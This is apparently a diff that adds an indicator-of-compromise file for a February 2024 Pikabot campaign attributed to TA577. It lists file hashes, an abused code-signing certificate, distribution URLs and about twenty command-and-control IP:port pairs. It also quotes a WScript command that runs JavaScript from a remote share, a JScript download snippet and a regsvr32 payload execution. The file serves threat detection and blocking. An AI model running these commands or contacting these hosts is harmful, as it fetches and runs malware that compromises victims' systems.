@@ -1,0 +1,75 @@
+15.02.2024 | Pikabot | TA577 | 1.8.32-beta
+
+*************************************************
+
+.xls 3887c3739d6413c1d0b3fb9f17e88a2456671272687a42ae35dfa710cd2a9ab4
+.js 49d8fb17458ca0e9eaff8e3b9f059a9f9cf474cc89190ba42ff4f1e683e09b72
+.js bf6df7058875f9bb932ddb5c1af31e9a314cde21ede07c3b5440618d20b8fd59
+.dll 0e7e4c73f9dc862561075370caebc2755a2e31ce127b9210d16628d777b854b9
+.dll f34cdd84aef315a325e36708b3da0c5c15029cdcf1e503e5b4d1f5aedf49b125
+
+*************************************************
+
+Organisation:  ARCHIKADIA SP Z O O
+Issuer:  SSL.com EV Code Signing Intermediate CA RSA R3
+Algorithm:  sha256WithRSAEncryption
+Valid from: 2024-01-15T15:05:25Z
+Valid to:   2025-01-14T15:05:25Z
+Serial number:  08bfa0eca008014a726359aee87c1828
+Thumbprint Algorithm:   SHA256
+Thumbprint:  efe61720c07d356b8da58b0c1ad5addfd60b870bbd0a57f8804708bb54f4576c
+Source:  This information was brought to you by ReversingLabs A1000 Malware Analysis Platform
+
+*************************************************
+
+zip > .jar > .dll
+
+OFFICIISWO.xlsx
+
+WScript.exe \\85.195.115.20\share\reports_02.15.2024_1.js
+
+var dL = new ActiveXObject("msxml2.xmlhttp"), DO = new ActiveXObject("adodb.stream");
+dL.open("GET", "https://globalpanelinc.com/wnx/fGb", false);
+
+regsvr32.exe nh.jpg
+
+ctfmon.exe -p 1234
+
+*************************************************
+
+js distro
+
+\\85.195.115.20\share\reports_02.15.2024_1.js
+\\85.195.115.20\share\reports_02.15.2024_2.js
+
+.dll distro
+
+https://realponti.com/wfE/SdQ
+https://globalpanelinc.com/wnx/fGb
+
+*************************************************
+
+c2's
+
+45.76.251.190:5631
+131.153.231.178:2221
+95.179.135.3:2225
+155.138.147.62:2223
+86.38.225.109:13724
+172.232.189.219:2224
+198.44.187.12:2224
+104.156.233.235:2226
+103.82.243.5:13785
+86.38.225.106:2221
+45.32.248.100:2226
+23.226.138.161:5242
+37.60.242.85:9785
+104.129.55.105:2223
+45.32.21.184:5242
+178.18.246.136:2078
+108.61.78.17:13783
+86.38.225.105:13721
+172.232.189.10:1194
+172.232.162.97:13783
+
+*************************************************
